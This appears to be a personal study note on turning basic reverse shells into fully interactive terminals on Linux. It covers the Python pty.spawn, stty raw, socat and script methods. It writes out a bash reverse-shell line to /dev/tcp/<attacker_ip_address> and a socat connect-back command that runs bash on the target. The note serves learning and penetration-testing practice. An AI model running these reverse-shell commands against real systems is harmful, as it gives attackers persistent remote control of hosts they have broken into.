---
created: 22-01-2026
tags:
  - shells
  - net_hack
---
## Interactive vs. non-interactive shells


>[!note] To learn more about how shells work inside and what components they consist of, see [[how_shells_work]].

Consider this command:

```bash
bash -u >& /dev/tcp/<attacker_ip_address>/<port> 0>&1
```

The shell is now reading its commands **directly from the raw network stream and writing its output directly to it**.

A non-interactive shell **completely bypasses the line discipline**. Your keyboard input is sent raw over the network and is read directly by the `bash` process on the target machine.

A reverse or bind shell you get on a target system will often be non-interactive. This is because in such cases, the shell process is typically spawned in a minimal environment that does not allocate a proper terminal (TTY).

To solve this, you will need to *upgrade* the shell to an interactive one.
## Upgrading to an interactive shell

At its core, a shell upgrade involves forcing the target operating system to allocate a new terminal session (a PTY) and redirecting our network socket's I/O to it.

## Linux shell upgrade
### Python PTY method

Python is almost always available on Linux systems, which makes it a good choice for shell upgrades. This method is probably the most reliable and common, it should be your go-to.

1. On your attacker machine, set up a listener, such as with Netcat:

```bash
nc -lvpn 1337
```

3. Gain a basic, non-interactive shell on the target.

4. On the target machine, use Python to allocate a PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

>[!interesting]+ How this code works
>- `import pty` imports the `pty` module that provides utilities for working with pseudo-terminals.
>- The `pty.spawn()` function takes a command, allocates a new pseudo-terminal, and executes the command in the pseud-terminal.
>- `"/bin/bash"` is the command `pty.spawn()` runs inside a new, interactive PTY. This could be `/bin/sh`, `/bin/zsh`, etc., but Bash is the most common.

>[!tip]+ Finding Python executable
>- To find the Python executable, run:
>```bash
>which python python2 python3
>```
>The `which` command will only output those programs stored in one of the directories specified in the `PATH` variable. Python will almost always be in one of the `PATH` directories so this should not be an issue. Otherwise, you can use `find`.

>[!note] The code is the same for both Python 3 and Python 2.

Crucially, the code `spawn()` attaches the **slave side** of the allocated PTY to the standard streams (`stdin`, `stdout`, `stderr`) of the newly created Bash process. So, from that point on, any input you type in your Netcat session goes to the **master side** of the PTY, which is is then transmitted to the **slave side**, which the Bash shell reads from as if it were a real terminal Any output from Bash is written to the **slave side** of the PTY, travels back to the master side, and sent back to you through Netcat. 

PTYs is what a regular terminal on your Linux machine, such as `xterm`, `GNOME Terminal`, etc., uses to connect to the a shell process running locally (e.g., `/bin/bash`, `/bin/zsh`, etc.).

>[!note] To learn more about PTYs and how they work, see [[how_shells_work#Pseudoterminals]].

### `stty raw` method

This technique doesn't rely on any special tools on the target besides a basic shell. All the magic happens **on your side**.

1. On your attacker machine, set up a listener:

```bash
nc -lvpn 1337
```

2. Gain a basic, non-interactive shell on the target.

3. Background the Netcat process with `Ctrl + Z`:

```bash
user@target:~$ ^Z
[1]+  Stopped                 nc -lvnp 1337
attacker@kali:~$
```

This will suspend the `nc` process and return you to your local terminal.

4. Run `stty` to change settings on your local terminal, and then bring back the backgrounded Netcat process:

```bash
stty raw -echo && fg

```

>[!interesting]+ How this code works
> - The [`stty`](https://man.archlinux.org/man/stty.1.en) command is used to change terminal line settings.
> 	- `raw` enables the *raw mode* of operation (specifically, of the line discipline behind your terminal). This disables all special processing of input characters. In other words, your terminal no longer interprets `Ctrl + C` as `SIGINT`, `Ctlr + D` as `EOF`, and any special character sequences. It becomes a "dump" pipe; every character is interpreter literally and passed directly to the foreground process. This is needed so that when you type `Ctrl + C`, it's sent *through the network* to the remote shell, instead of being intercepted by your local terminal. Without it, `Ctrl + C` will terminate the Netcat process, not what's running inside the remote shell.
> 	- `-echo` disables the `echo` feature. This feature is why every character you type is not only sent to the shell (well, it's buffered by the line discipline first behind the scenes), but also printed back to you so you see what you typed. 
> 	- If you don't disable the `echo` feature, you would see every character **twice** — once from your local `echo`, and once from the remote shell's `echo`.
> - `fg` simply brings the most recently backgrounded job (`nc`) back into the foreground. Now, the Netcat is running again, but your local terminal is in the raw mode.

5. Change shell dimensions (needed for interactive programs like `vim` and `top` that query this information to format their output):

```bash
stty rows 24 cols 80
```

>[!tip]+
>Once you finish, you can bring your terminal back to normal with `reset`:
>```bash
>reset
>```

### `socat` method

If [[socat]] is available on your target, it just solves all the problems.

1. On your attacker machine, start a `socat` listener:

```bash
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

2. On your target, connect to the listener:

```bash
socat TCP:<attacker_ip_address>:1337 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

>[!note] To learn more about what `socat` is and how to work with it, see [[socat]].

### `script` method

The [`script`](https://man.archlinux.org/man/script.1) command is used to make a *typescript* of everything on your terminal session. By default, it captures all terminal input and output in a file named `typescript`. It's like log of the session.

1. On your attacker machine, set up a listener:

```bash
nc -lvpn 1337
```

2. Gain a basic, non-interactive shell on the target.

3. On the target, run:

```bash
script /dev/null -c bash
```
### `mkfifo` method
## References and further reading

- [`Upgrade to Fully Interactive TTYs — 0xffsec`](https://0xffsec.com/handbook/shells/full-tty/)
- [`Upgrading Simple Shells to Fully Interactive TTYs — ropnop blog`](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
- [`Understanding Linux Shells: Interactive, Non-Interactive, and RC Files — DEV.to`](https://dev.to/lionthehoon/understanding-linux-shells-interactive-non-interactive-and-rc-files-3eli)
- [`stty — man pages`](https://man.archlinux.org/man/stty.1.en)